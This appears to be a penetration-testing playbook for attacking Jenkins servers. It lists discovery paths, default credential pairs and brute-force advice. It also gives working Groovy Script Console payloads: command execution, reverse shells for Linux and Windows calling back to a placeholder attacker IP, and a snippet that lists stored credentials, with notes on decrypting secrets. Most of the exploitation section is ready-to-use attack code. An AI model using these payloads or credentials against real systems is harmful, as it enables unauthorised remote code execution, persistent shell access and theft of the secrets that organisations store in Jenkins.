# Jenkins Assessment
**Concept:** Jenkins is an open-source automation server. It allows admins to execute arbitrary code via the "Script Console" feature, which uses Apache Groovy. If credentials are obtained (or authentication is missing), RCE is trivial. 
**Attack Surface:** Default Credentials, Unauthenticated Script Console, Deserialization Exploits.
## 1. Discovery & Fingerprinting
**Goal:** Identify Jenkins instances and access the login portal.
### Service Enumeration
Jenkins typically listens on ports **8080** or **8000**.
- **Indicators:** HTTP Header `X-Jenkins`, Login page title "Sign in [Jenkins]". 
- **Critical Paths:**
    - `/login` (Auth)
    - `/script` (Console - Check for unauthenticated access)
    - `/configureSecurity/` (Security Config)
## 2. Authentication (Access)
**Goal:** Gain administrative access to the dashboard.
### Default Credentials
Jenkins does not enforce strong default passwords in older versions.
- **Credentials:** `admin:admin`
- **Credentials:** `admin:password`
- **Credentials:** `jenkins:jenkins`
### Brute Force
If defaults fail, spray common credentials. Jenkins does not typically have aggressive lockout policies by default (though plugins might).
## 3. Exploitation: Script Console (Groovy RCE)
**Goal:** Execute system commands using the built-in Groovy script console. 
**Access:** Navigate to `http://<TARGET>:8080/script`.
### Payload A: Command Execution (Reconnaissance)
Verify code execution and check user context.

**Groovy (Cross-Platform):**
```groovy
def cmd = "whoami" // Or "id" on Linux
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout
```

**Groovy (Windows Specific):**
```groovy
def cmd = "cmd.exe /c dir".execute();
println("${cmd.text}");
```
### Payload B: Reverse Shell (Linux)
Execute a bash reverse shell without touching the disk.

**Groovy Payload:**
```groovy
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<ATTACKER_IP>/<PORT>;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
### Payload C: Reverse Shell (Windows)
Since PowerShell might be restricted, use a native Java socket reverse shell.

**Groovy Payload:**
```groovy
String host="<ATTACKER_IP>";
int port=<PORT>;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){
    while(pi.available()>0)so.write(pi.read());
    while(pe.available()>0)so.write(pe.read());
    while(si.available()>0)po.write(si.read());
    so.flush();po.flush();
    Thread.sleep(50);
    try {p.exitValue();break;}catch (Exception e){}
};
p.destroy();
s.close();
```
## 4. Post-Exploitation Notes
**Goal:** Maximize value from the compromised instance.
1. **Privilege Level:** Jenkins often runs as `root` (Linux) or `SYSTEM` (Windows) to facilitate software installation and service management. Check `whoami` immediately.
2. **Credentials:** Jenkins stores secrets (API keys, SSH keys, passwords) in `credentials.xml` and `secrets/`. These are encrypted but can be decrypted using the `hudson.util.Secret.decrypt()` function within the Script Console itself.
    - _Payload to Dump Secrets:_
```groovy
com.cloudbees.plugins.credentials.SystemCredentialsProvider.getInstance().getCredentials().forEach{
  println(it.getId() + ": " + it.getDescription())
}
```